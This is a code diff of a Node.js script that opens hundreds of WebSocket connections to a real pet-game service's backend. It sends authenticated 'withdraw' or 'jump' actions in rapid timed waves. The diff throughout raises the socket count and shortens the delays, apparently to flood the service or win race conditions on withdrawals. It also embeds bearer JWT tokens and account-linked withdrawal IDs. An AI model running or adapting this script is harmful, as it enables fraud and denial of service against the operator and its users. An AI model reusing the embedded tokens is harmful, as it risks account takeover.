@@ -5,45 +5,51 @@ import { v4 as uuidv4 } from "uuid";
 const endpoint = "wss://petbot-monorepo-websocket-333713154917.europe-west1.run.app/";
 const origin = "https://app.pett.ai";
 
-/** ====== CONFIG ====== */
-const CONNECT_STAGGER_MS = 75;       // ms between scheduling new connects
-const CONNECT_TIMEOUT_MS = 15000;    // handshake deadline per socket
-const MAX_CONNECT_RETRIES = 3;       // retries per socket
-const MAX_CONCURRENT_CONNECTS = 30;  // simultaneous
-
 // Modes allowed
 let type = "jump"; // "withdraw" | "jump"
 
-/** ====== INPUT: MULTI-JWT + WITHDRAW IDS ====== */
+/** ====== CONFIG ====== */
+const CONNECT_STAGGER_MS = 50;       // ms between scheduling new connects
+const CONNECT_TIMEOUT_MS = 15000;    // handshake deadline per socket
+const MAX_CONNECT_RETRIES = 3;       // retries per socket
+const MAX_CONCURRENT_CONNECTS = 50;  // simultaneous
 
+// Full vs Used sockets
+const TOTAL_SOCKETS = 300; // actually connect this many
+const ACTIVE_LIMIT = 40;  // but only *use* this many once connected
+
+/** ====== INPUT: MULTI-JWT + WITHDRAW IDS ====== */
 const jwtGroups = [
   {
-    jwt: "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWZwbjJyM3AwMGQ4bDgwY3E4enVndnZjIiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTgyMjk1MjIsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21lMGtsaHZkMDBieGt6MGJsaHJrNGxwNCIsImV4cCI6MTc1ODIzMzEyMn0.JIYOegqqmOM0oVdTJpXGhf639qCGhbz-8Yedk0JyRRxEoRtZgEc1-Nykm06W2oIMy0BMzFntfEYEC4QvBdk3RQ",
+    jwt: "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWZxMzdvbjQwMDJmbGQwZHFhMXdmcTc2IiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTgyNDA4NjMsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21lMGx0N25mMDA5MWpsMGJ6b2tybDB4aiIsImV4cCI6MTc1ODI0NDQ2M30.YBdPGbGWMkYh61Qd2mcZQT0d-B0zC2Erd0e_OpQfjM3UnJbIRGLEgdtn53FNZqGrmbl4yH3rQiT_qXkbPOpDvw",
     withdrawals: [
-      "8fe82985-cd89-4578-a4fe-5da90cefb66b",
-      "1c027585-0a08-451c-8ee1-c891f9cfbaa2",
-      "43a0b6a3-75cc-49ea-9906-7dc0f8cdc25e",
-      "d820f693-bbb5-44ae-9d60-f9e21344f52b",
-      "eadf6782-70e8-405f-924f-e86d1330a937",
-      "5f561d7a-8808-4d1f-bc13-9be768323034",
-      "cfb63d8f-851e-4e8f-857f-d92cfcbfab94",
-      "80af74cd-1cc8-4287-a045-86164607636c",
-      "b09e0b5e-f137-4f37-9173-7c02071a53c3"
+      // Gamby
+      // "8fe82985-cd89-4578-a4fe-5da90cefb66b",
+      // "1c027585-0a08-451c-8ee1-c891f9cfbaa2",
+      // "43a0b6a3-75cc-49ea-9906-7dc0f8cdc25e",
+      // "d820f693-bbb5-44ae-9d60-f9e21344f52b",
+      // "eadf6782-70e8-405f-924f-e86d1330a937",
+      // "5f561d7a-8808-4d1f-bc13-9be768323034",
+      // "cfb63d8f-851e-4e8f-857f-d92cfcbfab94",
+      // "80af74cd-1cc8-4287-a045-86164607636c",
+      // "b09e0b5e-f137-4f37-9173-7c02071a53c3",
+      // GeeBaby
+      "535657fd-365e-4e99-a4eb-6054f34f6a0a",
+      "4e7e6882-eff6-49f8-8cde-08beffe39b3e",
+      "db6fb7dd-c7ba-4c11-97ce-37530b374bd0",
+      "8c162aa7-5a95-454f-b7ee-8c870eb49919",
+      "6ec75923-5c09-412f-b762-8d1b84469428",
+      "0909df82-c2b2-4ccc-9c10-15b60ba6052d",
+      "ceaa7727-e0e7-4f64-9bad-41d8cd9192f1",
+      "7d2578ee-d448-4b96-a528-10bb6a485f6e",
+      "87ec7da0-4d88-4692-8fd8-24378705b0fd",
     ],
   },
-//   {
-//     jwt: "",
-//     withdrawals: [
-//       "33333333-aaaa-bbbb-cccc-333333333333",
-//       "44444444-aaaa-bbbb-cccc-444444444444",
-//     ],
-//   },
 ];
 
 /** ====== HELPERS ====== */
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-// const uniqueNonce = () => uuidv4();
-const uniqueNonce = () => crypto.randomUUID();
+const uniqueNonce = () => uuidv4();
 
 function pickWithdrawalId(group) {
   const list = group.withdrawals;
@@ -69,22 +75,6 @@ const makeJumpString = (id) => JSON.stringify({
   nonce: uniqueNonce(),
 });
 
-/** ====== CONFIGS ====== */
-const CONFIGS = {
-  withdraw: {
-    TOTAL_SOCKETS: 2,
-    REQUESTS_PER_SOCKET: 1,
-    BLAST_DURATION_MS: 200,
-    REST_BETWEEN_WAVES_MS: 1500,
-  },
-  jump: {
-    TOTAL_SOCKETS: 2,
-    REQUESTS_PER_SOCKET: 1,
-    BLAST_DURATION_MS: 200,
-    REST_BETWEEN_WAVES_MS: 1500,
-  },
-};
-
 const NEEDS_AUTH_FIRST = new Set(["withdraw", "jump"]);
 
 /** ====== GROUP RUNNER (per JWT) ====== */
@@ -96,8 +86,6 @@ function runGroup(group, accountIndex) {
   let totalSent = 0;
   let inFlightConnects = 0;
 
-  const cfg = CONFIGS[type];
-
   /** action per socket */
   async function sendActionForSocket(sock) {
     if (sock.ws.readyState !== WebSocket.OPEN) return;
@@ -105,7 +93,7 @@ function runGroup(group, accountIndex) {
     if (NEEDS_AUTH_FIRST.has(type) && !sock.didAuth) {
       sock.ws.send(makeAuthString(group.jwt));
       sock.didAuth = true;
-      await sleep(500); // short delay after AUTH
+      await sleep(200);
     }
 
     const withdrawalId = pickWithdrawalId(group);
@@ -115,7 +103,10 @@ function runGroup(group, accountIndex) {
 
   /** blast loop */
   function blastWave() {
-    const live = sockets.filter(s => s.ws.readyState === WebSocket.OPEN);
+    const live = sockets
+      .filter(s => s.ws.readyState === WebSocket.OPEN)
+      .slice(0, ACTIVE_LIMIT); // 🔥 only use first 100
+
     if (!live.length) {
       console.log(`⚠ [Acc#${accountIndex}] No live sockets remain`);
       sendingStarted = false;
@@ -126,34 +117,29 @@ function runGroup(group, accountIndex) {
     blasting = true;
     waveCounter++;
     let sentThisWave = 0;
-    const interval = cfg.BLAST_DURATION_MS / cfg.REQUESTS_PER_SOCKET;
 
     for (const sock of live) {
-      for (let j = 0; j < cfg.REQUESTS_PER_SOCKET; j++) {
-        setTimeout(() => {
-          sendActionForSocket(sock).then(() => {
-            sentThisWave++;
-          }).catch(() => {});
-        }, j * interval);
-      }
+      setTimeout(() => {
+        sendActionForSocket(sock).then(() => sentThisWave++);
+      }, 0);
     }
 
     setTimeout(() => {
       totalSent += sentThisWave;
       console.log(
-        `⚡ [Acc#${accountIndex}] Wave #${waveCounter}: sent=${sentThisWave} · live=${live.length} · totalSent=${totalSent}`
+        `⚡ [Acc#${accountIndex}] Wave #${waveCounter}: sent=${sentThisWave} · liveUsed=${live.length}/${ACTIVE_LIMIT} · connected=${sockets.length}/${TOTAL_SOCKETS}`
       );
       blasting = false;
-      setTimeout(blastWave, cfg.REST_BETWEEN_WAVES_MS);
-    }, cfg.BLAST_DURATION_MS + 20);
+      setTimeout(blastWave, 1500);
+    }, 200);
   }
 
-  /** start sending when all sockets connected */
+  /** start sending when enough sockets connected */
   function startSendingIfReady() {
     if (sendingStarted) return;
-    if (sockets.length !== cfg.TOTAL_SOCKETS) return;
+    if (sockets.length < ACTIVE_LIMIT) return; // wait until at least 100 are ready
     sendingStarted = true;
-    console.log(`🚀 [Acc#${accountIndex}] All sockets ready`);
+    console.log(`🚀 [Acc#${accountIndex}] Using first ${ACTIVE_LIMIT} sockets (out of ${sockets.length} connected/${TOTAL_SOCKETS} total)...`);
     blastWave();
   }
 
@@ -177,7 +163,7 @@ function runGroup(group, accountIndex) {
         settled = true;
         clearTimeout(to);
         sockets.push(sock);
-        console.log(`✅ [Acc#${accountIndex}] Socket ${socketId} connected (${sockets.length}/${cfg.TOTAL_SOCKETS})`);
+        console.log(`✅ [Acc#${accountIndex}] Socket ${socketId} connected (${sockets.length}/${TOTAL_SOCKETS})`);
         ws.on("message", (m) => {
           try {
             const msg = JSON.parse(m.toString());
@@ -190,7 +176,9 @@ function runGroup(group, accountIndex) {
 
       ws.on("message", (m) => {
         const msg = JSON.parse(m.toString());
-        console.log(msg);
+        if (msg.type === 'data') {
+          console.log(msg);
+        }
       })
 
       ws.on("close", () => {
@@ -223,7 +211,7 @@ function runGroup(group, accountIndex) {
     }
   }
 
-  /** boot sockets */
+  /** boot sockets (all 300) */
   async function bootOpenSockets(target) {
     const ids = Array.from({ length: target }, (_, i) => i + 1);
     for (const id of ids) {
@@ -237,8 +225,8 @@ function runGroup(group, accountIndex) {
     }
   }
 
-  console.log(`🔌 [Acc#${accountIndex}] Opening ${cfg.TOTAL_SOCKETS} sockets (${type.toUpperCase()})...`);
-  bootOpenSockets(cfg.TOTAL_SOCKETS).catch(err => {
+  console.log(`🔌 [Acc#${accountIndex}] Opening ${TOTAL_SOCKETS} sockets (only ${ACTIVE_LIMIT} will be used) in ${type.toUpperCase()} mode...`);
+  bootOpenSockets(TOTAL_SOCKETS).catch(err => {
     console.error(`❌ [Acc#${accountIndex}] bootOpenSockets fatal:`, err?.message || err);
   });
 }
